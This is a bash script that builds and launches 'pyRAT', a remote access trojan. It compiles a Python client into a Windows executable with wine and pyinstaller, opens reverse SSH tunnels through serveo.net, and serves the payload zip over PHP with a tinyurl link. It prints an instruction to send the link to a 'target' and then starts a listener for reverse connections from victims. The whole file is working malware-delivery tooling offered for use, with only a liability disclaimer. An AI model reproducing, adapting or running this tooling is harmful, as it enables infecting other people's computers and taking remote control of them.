#!/bin/bash
# pyRAT v1.0
# Coded by @linux_choice (Don't change! Read the License!)
# Github: https://github.com/thelinuxchoice/pyRAT

trap 'printf "\n";stop;exit 1' 2


banner() {

 
   
printf "\e[1;93m      _|_                                             \e[0m\e[1;93m_|_     \n"
printf "\e[1;93m     \`\`|\`      \e[0m\e[1;77m              ____      _  _____ \e[0m\e[1;93m      \`|\`\`    \e[0m\n"
printf "\e[1;93m    \`\`\`|\`\`     \e[0m\e[1;77m  _ __  _   _|  _ \    / \|_   _|\e[0m\e[1;93m     \`\`|\`\`\`   \e[0m\n"
printf "\e[1;93m    \`__!__     \e[0m\e[1;77m | '_ \| | | | |_) |  / _ \ | |  \e[0m\e[1;93m     __!__\`   \e[0m\n"
printf "\e[1;93m    :     := -}\e[0m\e[1;77m | |_) | |_| |  _ <  / ___ \| |  \e[0m\e[1;93m{- =:     :   \e[0m\n"
printf "\e[1;93m    '.   .'    \e[0m\e[1;77m | .__/ \__, |_| \_\/_/   \_\_|  \e[0m\e[1;93m    '.   .'   \e[0m\n"
printf "\e[1;93m ~-=~~-=~~-=~~ \e[0m\e[1;77m |_|    |___/v1.0                \e[0m\e[1;93m~-=~~-=~~-=~~ \e[0m\n"
printf "\n"
printf "\e[1;77m      Coded by: https://github.com/thelinuxchoice/pyRAT\e[0m\n"
printf "\n"
printf " \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not ::\e[0m\n"
printf " \e[101m\e[1;77m:: responsible for any misuse or damage caused by pyRAT   ::\e[0m\n"

}


stop() {

checkphp=$(ps aux | grep php)
checkssh=$(ps aux | grep ssh)

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi



}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 
command -v wine > /dev/null 2>&1 || { echo >&2 "I require wine but it's not installed. Install it. Aborting."; exit 1; } 


}

payload() {


if [[ -d build/ ]]; then
rm -rf build/ 
fi

if [[ -d dist/ ]]; then
rm -rf dist/
fi

if [[ -e client.spec ]]; then
rm -rf client.spec
fi

if [[ ! -d ~/.wine/drive_c/Python27/ ]]; then
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Wine Python dir not found, run install.sh\n"
exit 1
fi
 
sed 's+forwarding+'$url'+g' pyrat-client.py | sed 's+payload_username+'$payload_username'+g' | sed 's+payload_password+'$payload_password'+g' | sed 's+serveo_port+'$port2'+g' > $payload_name.py
sed 's+payload_username+'$payload_username'+g' pyrat-server.py | sed 's+payload_password+'$payload_password'+g' > $payload_name-server.py
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Please wait, converting python payload to exe file...\e[0m" $url
wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --windowed $payload_name.py > /dev/null 2>&1

if [[ -e dist/$payload_name/$payload_name.exe ]]; then
printf "\e[1;77m Done!\e[0m\n"
else
printf "\e[1;93m FAIL!\n [!] Check Wine dependencies (python for windows) \e[0m\n"
exit 1
fi

cd dist/
IFS=$'\n'
zip -r $payload_name.zip $payload_name/ > /dev/null 2>&1
mv $payload_name.zip ../$payload_name.zip
cd ..



}


server_serveo() {
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting server \e[0m\e[1;77m%s\e[0m\n" $url
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting server \e[0m\e[1;77mhttp://serveo.net:%s\e[0m\n" $port2


if [ ! -d uploadedfiles/ ]; then
mkdir uploadedfiles/
fi

fuser -k 3333/tcp > /dev/null 2>&1
fuser -k 4444/tcp > /dev/null 2>&1
fuser -k 5555/tcp > /dev/null 2>&1
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 -R '$port2':localhost:5555 2> /dev/null > sendlink' &
sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/%s.zip \n' $send_link $payload_name
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.zip | head -n1)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

php -S "localhost:3333" > /dev/null 2>&1  &
php -S "localhost:4444" > /dev/null 2>&1  &
sleep 3

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting listener...\e[0m\e[1;77m\n"
python $payload_name-server.py #localhost 5555

}



port_conn() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose Port1 to reverse connection (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose Port 2 (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port2
read port2
port2="${port2:-${default_port2}}"
url="http://serveo.net:$port"
}


start() {

default_payload_name="pyRAT"
printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
IFS=$'\n'
read payload_name
payload_name="${payload_name:-${default_payload_name}}"
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] PyRAT credentials config \e[0m\n'
default_payload_username="pyRAT"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose Username (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_username
read payload_username
payload_username="${payload_username:-${default_payload_username}}"
default_payload_password="CaptainHook"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose Password (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_password
read payload_password
payload_password="${payload_password:-${default_payload_password}}"


port_conn
payload
stop
server_serveo

}

banner
dependencies
start


#wget https://www.python.org/ftp/python/2.7.15/python-2.7.15.msi
#wine msiexec /i python-2.7.15.msi /L*v log.txt
#dpkg --add-architecture i386 && apt-get update && apt-get install wine32
#cd ~/.wine/drive_c/Python27/
#wine python.exe Scripts/pip.exe install pyinstaller paramiko requests



